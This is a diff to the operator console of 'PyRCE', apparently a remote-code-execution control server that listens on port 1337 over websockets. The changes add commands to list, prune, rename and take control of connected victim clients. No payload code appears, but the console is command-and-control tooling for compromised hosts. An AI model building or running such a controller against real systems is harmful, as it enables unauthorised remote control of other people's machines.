@@ -15,7 +15,7 @@ if __name__ == "__main__":
         server = WebsocketServer("0.0.0.0", 1337, 'javascript')
         global listener_thread
         p = Printer()
-        print "PyRCE - Commands: listen, list, control"
+        p.info("PyRCE - Commands: listen, list, control")
         while True:
             cmd = raw_input('> ')
             if cmd == "listen":
@@ -28,15 +28,43 @@ if __name__ == "__main__":
                     p.info("There are no clients connected. Use 'listen' to collect clients.")
                 else:
                     for i,c in enumerate(server.CLIENTS):
-                        print "{}. {}".format(i+1, c.addr)
+                        print "{}. {}".format(i+1, c)
+            
+            if cmd == "update":
+                new_clients = []
+                for client in server.CLIENTS:
+                    if client.is_alive():
+                        new_clients.append(client)
+                    else:
+                        p.warn("{} is dead, removing.".format(client))
+                server.CLIENTS = new_clients
+                p.success("Successfully removed dead clients.")
+
+            if cmd == "rename":
+                p.prompt("Which client? (1 2 ...)")
+                for i,c in enumerate(server.CLIENTS):
+                    print "{}. {}".format(i+1, c)
+
+                client_num = int(raw_input())
+
+                p.prompt("What name?")
+
+                client_name = str(raw_input())
+
+                try:
+                    client = server.CLIENTS[client_num - 1]
+                    client.rename(client_name)
+                except IndexError as e:
+                    p.error("Cannot name that client.")
+
+
             if cmd == "control":
                 p.prompt("Which clients? (1 2 ...)")
                 for i,c in enumerate(server.CLIENTS):
-                    print "{}. {}".format(i+1, c.addr)
+                    print "{}. {}".format(i+1, c)
 
                 cmd = raw_input()
 
-                # client_socket = None
                 try:
                     indices = [int(i) for i in cmd.split(' ')]
                     sockets = []
@@ -55,4 +83,4 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
         p.info("Closing connection...")
-        server.server.close()
+        server.close_websocket_client()
